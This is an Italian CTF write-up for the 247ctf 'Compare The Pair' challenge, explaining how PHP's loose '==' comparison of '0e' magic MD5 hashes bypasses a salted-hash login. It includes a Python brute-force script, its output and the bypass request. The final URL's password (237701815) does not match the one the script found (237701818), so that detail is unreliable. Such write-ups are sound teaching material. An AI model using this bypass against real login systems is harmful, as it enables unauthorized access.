<!DOCTYPE html>
<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="description" content="Compare The Pair - WEB Platform 247ctf Difficoltà: Moderate (Relativo alla piattaforma) Link https://247ctf.com/ Descrizione Can you identify a way to bypass our login logic? MD5 is supposed to be a one-way function right? In questa CTF ci viene fornito un endpoint in cui viene mostrato il codice sorgente della pagina stessa. Il nostro obiettivo è bypassare la logica di login:
&lt;?php require_once(&#39;flag.php&#39;); $password_hash = &#34;0e902564435691274142490923013038&#34;; $salt = &#34;f789bbc328a3d1a3&#34;; if(isset($_GET[&#39;password&#39;]) &amp;&amp; md5($salt .">  

  <title>
    
      247ctf Compare the Pair
    
  </title>


  <link rel="shortcut icon" type="image/x-icon" href="/" />
  
  
  
  <link rel="stylesheet" href="/css/main.9a52a4ee12d1188ebf087e7e00537228e46636a98704dadaf471fe008d3c250b854681c0253f1527a9ccc533e2f6cd4355dcd709cc9781d0fa61e7f27d7a3bf2.css" integrity="sha512-mlKk7hLRGI6/CH5&#43;AFNyKORmNqmHBNra9HH&#43;AI08JQuFRoHAJT8VJ6nMxTPi9s1DVdzXCcyXgdD6YefyfXo78g==" />
  
</head>
<body a="auto">
        <main class="page-content" aria-label="Content">
            <div class="w">
                <div class="post-meta">
                    <a href="/">..</a>

                    <p>
                        <time datetime="2025-10-19 23:44:44 &#43;0200 CEST">
                            2025-10-19
                        </time>
                    </p>
                </div>

<article>
    <h1>247ctf Compare the Pair</h1>

    

    <h1 id="compare-the-pair---web">Compare The Pair - WEB</h1>
<ul>
<li><strong>Platform</strong> 247ctf</li>
<li><strong>Difficoltà:</strong> Moderate (Relativo alla piattaforma)</li>
<li><strong>Link</strong> <a href="https://247ctf.com/">https://247ctf.com/</a></li>
</ul>
<h2 id="descrizione">Descrizione</h2>
<pre tabindex="0"><code>Can you identify a way to bypass our login logic? MD5 is supposed to be a one-way function right?
</code></pre><p>In questa CTF ci viene fornito un endpoint in cui viene mostrato il codice sorgente della pagina stessa. Il nostro obiettivo è bypassare la logica di login:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">require_once</span>(<span style="color:#e6db74">&#39;flag.php&#39;</span>);
</span></span><span style="display:flex;"><span>  $password_hash <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0e902564435691274142490923013038&#34;</span>;
</span></span><span style="display:flex;"><span>  $salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;f789bbc328a3d1a3&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;password&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">md5</span>($salt <span style="color:#f92672">.</span> $_GET[<span style="color:#e6db74">&#39;password&#39;</span>]) <span style="color:#f92672">==</span> $password_hash){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $flag;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><h2 id="analisi">Analisi</h2>
<p>Il codice è strutturalmente molto semplice: la flag della CTF si trova nel file &lsquo;flag.php&rsquo; che viene mostrato solo e soltanto se viene soddisfatta questa condizione:</p>
<p><code>if(isset($_GET['password']) &amp;&amp; md5($salt . $_GET['password']) == $password_hash){</code></p>
<p>Facendo un HTTP GET a questa pagina, impostando il query param &ldquo;password&rdquo; viene calcolato l&rsquo;hash del parametro e confrontato con quello hardcoded del codice.</p>
<p>L’hash viene calcolato tramite la funzione <code>md5($salt . $_GET['password'])</code>. Da questo sappiamo che l’algoritmo di hashing utilizzato è MD5 e che viene applicato un salt, il quale viene semplicemente concatenato alla password fornita come parametro. Per nostra fortuna, sia il salt che l’hash della password sono entrambi hardcoded nel codice sorgente.</p>
<p>È molto semplice passare subito all&rsquo;attacco con hashcat cercato di ottenere la password tramite bruteforce o facendo utilizzo di un dizionario, tuttavia è un metodo poco interessante e sopratutto non abbiamo la certezza di riuscire a ricavare la password in questo modo. Per questa CTF ipotizziamo che MD5 abbia un minimo di dignità e sia relativamente robusto.</p>
<p>Guardando il codice attentamente c&rsquo;è un particolare tanto subdolo quanto pericoloso: il modo in cui è fatto il confronto. Quello che può essere un banale operatore di confronto in PHP (<code>==</code>) nasconde un&rsquo;insidia che può trarre in inganno chi non conosce PHP o chi ha sorvolato questo aspetto. PHP ha due operatori di confronto:</p>
<p>L&rsquo;operatore &ldquo;uguale&rdquo; :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>$b <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;5&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">var_dump</span>($a <span style="color:#f92672">==</span> $b); <span style="color:#75715e">// true
</span></span></span></code></pre></div><p>Controlla se i valori sono uguali dopo la conversione di tipo (type juggling).</p>
<p>L&rsquo;operatore &ldquo;identico&rdquo;:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>$b <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;5&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">var_dump</span>($a <span style="color:#f92672">===</span> $b); <span style="color:#75715e">// false
</span></span></span></code></pre></div><p>Decisamente più robuto che controlla valore e tipo.</p>
<p>Nel nostro caso, il confronto che viene fatto è del primo tipo quindi gli operatori sono soggetti al type juggling.  Il type juggling è la conversione automatica di un tipo di dato in un altro, quando necessario. Non è una caratteristica unica a PHP, altri linguaggi non tipizzati hanno lo stesso meccanismo. Ma come possiamo sfruttarlo in questo caso?</p>
<p>Osserviamo attentamente l&rsquo;hash della password hardcoded: <code>0e902564435691274142490923013038</code></p>
<p>Come si può notare è un hash particolare in quanto costituito esclusivamente da numeri ad esclusione della seconda cifra che contiene il carattere <code>e</code>. Questa stringa assomiglia alla rappresentazione scientifica di un numero, in particolare 0 x 10^(902564435691274142490923013038), ovvero 0.
Questo genere di stringhe in PHP viene definito “numeric string” e, nel momento in cui le vogliamo confrontare, PHP le converte in numero. Questo significa che, se riusciamo a produrre un hash che sembri una numeric string e quindi un numero in notazione scientifica, non stiamo più confrontando stringhe, ma numeri.
Per bypassare il login serve una password il cui hash (con salt) produca una stringa che inizi per 0e (cioè zeri seguiti dal carattere <code>e</code>) e contenga solo numeri.</p>
<h2 id="soluzione">Soluzione</h2>
<p>Passiamo ora a scrivere uno script per poter trovare la password che ci serve. Non sarà la soluzione più efficiente possibile ma fa il suo lavoro:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;f789bbc328a3d1a3&#39;</span>
</span></span><span style="display:flex;"><span>nonce <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Starting password cracking...&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> nonce <span style="color:#f92672">%</span> <span style="color:#ae81ff">1000</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> nonce <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Trying nonce: </span><span style="color:#e6db74">{</span>nonce<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> salt <span style="color:#f92672">+</span> str(nonce)
</span></span><span style="display:flex;"><span>    hashed <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(password<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> hashed[:<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e&#39;</span> <span style="color:#f92672">and</span> hashed[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>isdigit():
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Valid password found: </span><span style="color:#e6db74">{</span>nonce<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;Hash: &#39;</span>, hashed)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    nonce <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>Il suo funzionamento è molto semplice, attraverso una nonce che incrementiamo ad ogni iterazione, verifichiamo se il suo hash corrisponda al pattern che stiamo cercando.</p>
<p>(Riflettendoci, concettualmente non è tanto diverso da mining :)  )</p>
<h2 id="risultato">Risultato</h2>
<p>Dopo qualche minuto il nostro - non per nulla efficiente - script ci mostra una password valida:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237694000</span>
</span></span><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237695000</span>
</span></span><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237696000</span>
</span></span><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237697000</span>
</span></span><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237698000</span>
</span></span><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237699000</span>
</span></span><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237700000</span>
</span></span><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237701000</span>
</span></span><span style="display:flex;"><span>Valid password found: <span style="color:#ae81ff">237701818</span>
</span></span><span style="display:flex;"><span>Hash:  0e668271403484922599527929534016
</span></span></code></pre></div><p>È importante notare come questa non è la password corretta, infatti l&rsquo;hash è decisamente diverso da quello che abbiamo:</p>
<p><code>md5('f789bbc328a3d1a3237701818') -&gt; 0e668271403484922599527929534016 != 0e902564435691274142490923013038</code></p>
<p>Tuttavia è una numeric string che causa questo comportamento:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php &gt; echo <span style="color:#e6db74">&#39;0e902564435691274142490923013038&#39;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e668271403484922599527929534016&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>Infatti qualunque stringa che segue il formato sarà true:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php &gt; echo <span style="color:#e6db74">&#39;0e902564435691274142490923013038&#39;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e0&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>php &gt; echo <span style="color:#e6db74">&#39;0e902564435691274142490923013038&#39;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e123&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>php &gt; echo <span style="color:#e6db74">&#39;0e902564435691274142490923013038&#39;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e9999999999999&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>Utilizzando la password trovata dal nostro script come query params ( <a href="https://8e2e86060d2436d1.247ctf.com/?password=237701815">https://8e2e86060d2436d1.247ctf.com/?password=237701815</a> ) otteniamo il nostro premio:</p>
<p><img src="/images/ctf/247ctf-compare-the-pair/flag_found.png" alt="FLAG FOUND"></p>

</article>

            </div>
        </main>
    </body></html>
